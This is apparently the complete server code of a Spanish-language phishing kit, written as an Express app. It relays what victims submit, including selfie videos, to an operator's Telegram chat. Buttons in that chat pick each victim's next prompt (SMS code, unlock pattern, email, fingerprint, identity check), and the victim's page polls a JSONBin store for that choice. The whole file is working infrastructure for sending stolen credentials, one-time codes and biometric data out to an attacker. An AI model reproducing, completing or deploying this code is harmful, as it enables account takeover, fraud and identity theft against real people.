const express = require('express');
const path = require('path');

const app = express();
const port = process.env.PORT || 8080;

app.use(express.json({ limit: '50mb' }));

// API: Check Action
app.get('/api/check-action', async (req, res) => {
  const sessionId = req.query.id;
  if (!sessionId) return res.status(200).json({ action: 'pending' });

  const BIN_ID = process.env.JSONBIN_BIN_ID;
  const API_KEY = process.env.JSONBIN_API_KEY;

  if (!BIN_ID || !API_KEY) return res.status(200).json({ action: 'pending' });

  try {
    const resp = await fetch('https://api.jsonbin.io/v3/b/' + BIN_ID + '/latest', { headers: { 'X-Master-Key': API_KEY } });
    const jsonResp = await resp.json();
    const data = jsonResp.record || {};
    const action = data[sessionId];
    
    if (!action) return res.status(200).json({ action: 'pending' });
    
    const validActions = ['correct', 'incorrect', 'correo', 'patron', 'sms', 'nuevo', 'dactilar', 'identidad'];
    if (validActions.includes(action)) return res.status(200).json({ action: action });
    
    return res.status(200).json({ action: 'pending' });
  } catch (err) {
    return res.status(200).json({ action: 'pending' });
  }
});

// API: Send Telegram
app.post('/api/send-telegram', async (req, res) => {
  const { message, sessionId, buttons, btn1Label, btn2Label, btn3Label, btn3Action, btn4Label, btn4Action } = req.body;
  const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  if (!BOT_TOKEN || !CHAT_ID) return res.status(500).json({ error: 'Missing config' });

  const payload = { chat_id: CHAT_ID, text: message };

  if (buttons) {
    let keyboard = [
      [
        { text: btn1Label || 'Correcto', callback_data: JSON.stringify({ id: sessionId, action: 'correct' }) },
        { text: btn2Label || 'Incorrecto', callback_data: JSON.stringify({ id: sessionId, action: 'incorrect' }) }
      ]
    ];
    if (btn3Label && btn3Action) keyboard.push([{ text: btn3Label, callback_data: JSON.stringify({ id: sessionId, action: btn3Action }) }]);
    if (btn4Label && btn4Action) keyboard.push([{ text: btn4Label, callback_data: JSON.stringify({ id: sessionId, action: btn4Action }) }]);
    payload.reply_markup = { inline_keyboard: keyboard };
  }

  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    const data = await response.json();
    res.status(200).json(data);
  } catch (error) {
    res.status(500).json({ error: error.toString() });
  }
});

// API: Send Video
app.post('/api/send-video', async (req, res) => {
  const { videoBase64, caption } = req.body;
  if (!videoBase64) return res.status(400).json({ error: 'No video provided' });

  const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
  if (!BOT_TOKEN || !CHAT_ID) return res.status(500).json({ error: 'Missing config' });

  try {
    const buffer = Buffer.from(videoBase64, 'base64');
    const blob = new Blob([buffer], { type: 'video/webm' });
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('caption', caption);
    formData.append('video', blob, 'selfie.webm');

    const resp = await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendVideo', { method: 'POST', body: formData });
    const data = await resp.json();
    return res.status(200).json({ ok: data.ok, data: data });
  } catch (err) {
    return res.status(500).json({ ok: false, error: err.message });
  }
});

// API: Telegram Webhook
app.post('/api/telegram-webhook', async (req, res) => {
  res.status(200).send('OK');

  try {
    const update = req.body;
    if (!update.callback_query) return;

    const callbackQuery = update.callback_query;
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const BIN_ID = process.env.JSONBIN_BIN_ID;
    const API_KEY = process.env.JSONBIN_API_KEY;

    if (!BOT_TOKEN || !BIN_ID || !API_KEY) return;

    const data = JSON.parse(callbackQuery.data);
    const sessionId = data.id;
    const action = data.action;
    let buttonLabel = action;

    try {
      if (callbackQuery.message && callbackQuery.message.reply_markup && callbackQuery.message.reply_markup.inline_keyboard) {
        for (const row of callbackQuery.message.reply_markup.inline_keyboard) {
          for (const btn of row) {
            if (btn.callback_data) {
              const btnData = JSON.parse(btn.callback_data);
              if (btnData.action === action) buttonLabel = btn.text;
            }
          }
        }
      }
    } catch (e) {}

    try {
      let binResp = await fetch('https://api.jsonbin.io/v3/b/' + BIN_ID + '/latest', { headers: { 'X-Master-Key': API_KEY } });
      if (binResp.ok) {
        let binData = await binResp.json();
        let record = binData.record || {};
        record[sessionId] = action;
        await fetch('https://api.jsonbin.io/v3/b/' + BIN_ID, {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json', 'X-Master-Key': API_KEY },
          body: JSON.stringify(record)
        });
      }
    } catch (e) {}

    const messageId = callbackQuery.message.message_id;
    const chatId = callbackQuery.message.chat.id;

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, message_id: messageId, reply_markup: { inline_keyboard: [] } })
    }).catch(()=>{});

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: callbackQuery.id, text: 'Selección registrada: ' + buttonLabel })
    }).catch(()=>{});

  } catch (e) {}
});

app.use(express.static(path.join(__dirname, '/')));
app.get('*', (req, res) => {
  if (req.path.startsWith('/api/')) return res.status(404).json({ error: 'Not found' });
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(port, () => console.log(`Server running on port ${port}`));
